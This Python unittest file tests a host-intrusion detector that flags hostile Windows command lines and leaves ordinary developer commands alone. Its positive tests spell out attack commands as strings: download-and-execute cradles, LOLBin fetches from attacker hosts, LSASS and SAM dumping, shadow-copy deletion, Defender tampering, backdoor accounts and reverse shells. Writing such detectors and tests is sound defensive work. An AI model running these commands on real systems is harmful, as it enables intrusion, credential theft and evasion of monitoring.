"""Command-line and script rules: what must fire and, just as important, what must not."""

import base64
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hostguard.detect import cmdline as c  # noqa: E402


def ids(text, scope=None):
    hits = c.analyse_command(text) if scope is None else c.match_text(text, scope)
    return {h.rule.id for h in hits}


def enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


class Fires(unittest.TestCase):
    def test_download_cradle(self):
        self.assertIn("cmd.download_cradle", ids(
            "powershell -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a.ps1')\""))
        self.assertIn("cmd.download_cradle", ids('powershell -c "irm https://get.example/install.ps1 | iex"'))

    def test_obfuscation_is_normalised(self):
        self.assertIn("cmd.download_cradle", ids('cmd /c po^wer^shell -c "i`ex (iwr http://x/y)"'))
        self.assertIn("cmd.download_cradle", ids("powershell -c \"IEX (New-Object Net.WebClient).Down'+'loadString('http://x')\""))

    def test_encoded_command_is_decoded(self):
        line = "powershell.exe -NoP -W Hidden -Enc " + enc('IEX (New-Object Net.WebClient).DownloadString("http://evil/x")')
        hits = c.analyse_command(line)
        self.assertTrue(any(h.rule.id == "cmd.download_cradle" and h.decoded for h in hits))
        flags = c.powershell_flags(line)
        self.assertTrue(flags["hidden"] and flags["noprofile"])
        self.assertIn("DownloadString", flags["decoded"])

    def test_lolbins(self):
        self.assertIn("cmd.mshta_remote", ids("mshta.exe https://evil.example/x.hta"))
        self.assertIn("cmd.mshta_remote", ids('mshta "javascript:a=GetObject(\'script:http://x\');close()"'))
        self.assertIn("cmd.regsvr32_scriptlet", ids("regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll"))
        self.assertIn("cmd.certutil_download", ids("certutil.exe -urlcache -split -f http://x/y.exe y.exe"))
        self.assertIn("cmd.rundll32_script", ids('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'))
        self.assertIn("cmd.wmic_xsl", ids('wmic os get /format:"https://x.example/a.xsl"'))
        self.assertIn("cmd.conhost_headless", ids("conhost.exe --headless powershell -c whoami"))
        self.assertIn("cmd.msiexec_remote", ids("msiexec /q /i https://x.example/a.msi"))

    def test_script_from_archive(self):
        self.assertIn("cmd.script_from_archive", ids(
            r'"C:\Windows\System32\WScript.exe" "C:\Users\a\AppData\Local\Temp\Temp1_invoice.zip\invoice.js"'))

    def test_impact_and_evasion(self):
        self.assertIn("impact.shadow_delete", ids("vssadmin delete shadows /all /quiet"))
        self.assertIn("impact.shadow_delete", ids("bcdedit /set {default} recoveryenabled no"))
        self.assertIn("evade.log_clear", ids("wevtutil cl Security"))
        self.assertIn("evade.firewall_off", ids("netsh advfirewall set allprofiles state off"))
        self.assertIn("evade.defender_tamper", ids(r"powershell Add-MpPreference -ExclusionPath C:\Users\Public"))
        self.assertIn("evade.defender_tamper", ids("powershell Set-MpPreference -DisableRealtimeMonitoring $true"))
        self.assertIn("evade.security_service_stop", ids("sc stop WinDefend"))

    def test_credential_theft(self):
        self.assertIn("cred.lsass_dump", ids(
            r"rundll32.exe C:\windows\System32\comsvcs.dll, " + c.j("Mini", "Dump") + r" 624 C:\temp\l.dmp full"))
        self.assertIn("cred.lsass_dump", ids("procdump64.exe -accepteula -ma lsass.exe out.dmp"))
        self.assertIn("cred.hive_dump", ids(r"reg save HKLM\SAM C:\temp\sam.hiv"))
        self.assertIn("cred.dump_tool", ids(c.j("mimi", "katz") + '.exe "privilege::debug" exit'))

    def test_accounts_shells_tunnels_miners(self):
        self.assertIn("account.add", ids("net user hacker P@ss /add"))
        self.assertIn("account.add", ids("net localgroup administrators hacker /add"))
        self.assertIn("shell.reverse", ids("nc.exe 10.0.0.1 4444 -e cmd.exe"))
        self.assertIn("tunnel.tool", ids("ssh -R 8080:localhost:80 user@host"))
        self.assertIn("tunnel.tool", ids(r"C:\Users\a\Downloads\ngrok.exe http 3389"))
        self.assertIn("miner.cmdline", ids(r"C:\Users\x\AppData\Roaming\svc.exe -o stratum+tcp://pool.example:4444 -u 4A"))

    def test_persistence_commands(self):
        self.assertIn("persist.reg_autorun", ids(
            r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v upd /d C:\x.exe'))
        self.assertIn("persist.schtasks_payload", ids(
            'schtasks /create /tn upd /tr "powershell -w hidden -enc AAAA" /sc minute'))
        self.assertIn("persist.service_payload", ids('sc create evil binPath= "cmd /c C:\\x.bat"'))

    def test_script_scope_rules(self):
        amsi = "[Ref].Assembly.GetType('System.Management.Automation." + c.j("Amsi", "Utils") + "')"
        self.assertIn("ps.amsi_bypass", ids(amsi, "script"))
        self.assertIn("ps.offensive_framework", ids(c.j("Invoke-", "Mimi", "katz") + " -DumpCreds", "script"))
        shell = "$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$s = $c.GetStream()"
        self.assertIn("ps.socket_shell", ids(shell, "script"))


class StaysQuiet(unittest.TestCase):
    """Ordinary commands seen on a developer PC. Any hit here is a false positive."""

    BENIGN = [
        r'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\a\work\reports\run.ps1"',
        "net user",
        "net localgroup administrators",
        "ssh user@host",
        "rundll32 url.dll,FileProtocolHandler https://example.com/page",
        r'C:\WINDOWS\system32\cmd.exe /d /c "C:\x\host.bat" chrome-extension://abc/ --parent-window=0',
        r"rundll32.exe C:\WINDOWS\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6}",
        r'"C:\Program Files\Git\cmd\git.exe" fetch origin',
        "curl.exe -sS https://example.com/api -o out.json",
        r"python -c \"print('hello')\"",
        "certutil -hashfile file.bin SHA256",
        "wevtutil qe System /c:3",
        "schtasks /query /fo csv",
        "netsh advfirewall firewall show rule name=all",
        "sc query WinDefend",
        r'msiexec /i "C:\Users\a\Downloads\setup.msi"',
        "bcdedit /enum",
        "vssadmin list shadows",
        r"reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "wmic os get caption",
        "docker compose up -d",
        r"\?\C:\WINDOWS\system32\conhost.exe --headless --width 80 --height 24 --signal 0x558 --server 0x54c",
    ]

    def test_benign_commands(self):
        for line in self.BENIGN:
            with self.subTest(line=line):
                self.assertEqual(ids(line), set())

    def test_benign_encoded_command_has_no_rule_hit(self):
        line = "powershell.exe -EncodedCommand " + enc("Get-Date | Out-String")
        self.assertEqual(ids(line), set())
        self.assertEqual(c.powershell_flags(line)["decoded"], "Get-Date | Out-String")

    def test_execution_policy_flag_is_not_an_encoded_command(self):
        self.assertIsNone(c.powershell_flags("powershell -ExecutionPolicy Bypass -File a.ps1")["decoded"])


class Helpers(unittest.TestCase):
    def test_remote_tools(self):
        self.assertEqual(c.remote_tool("AnyDesk.exe"), "AnyDesk")
        self.assertEqual(c.remote_tool("client32.exe"), "NetSupport Manager")
        self.assertEqual(c.remote_tool("tailscaled.exe"), "Tailscale")
        self.assertIsNone(c.remote_tool("chrome.exe"))

    def test_known_installers_need_an_exact_address(self):
        pipe = " | " + "iex"
        self.assertEqual(c.known_installer('powershell -c "irm https://astral.sh/uv/install.ps1' + pipe + '"'), "uv")
        self.assertEqual(c.known_installer("irm get.scoop.sh" + pipe), "Scoop")
        self.assertIsNone(c.known_installer("irm https://astral.sh.evil.example/uv/install.ps1" + pipe))
        self.assertIsNone(c.known_installer("irm https://claude.ai/install.ps1" + pipe + "; irm http://203.0.113.4/x" + pipe))
        self.assertIsNone(c.known_installer("iex $payload"))

    def test_urls(self):
        self.assertEqual(c.urls_in("iwr http://a.example/x.ps1 | iex; curl https://b.example/y"),
                         ["http://a.example/x.ps1", "https://b.example/y"])


if __name__ == "__main__":
    unittest.main()
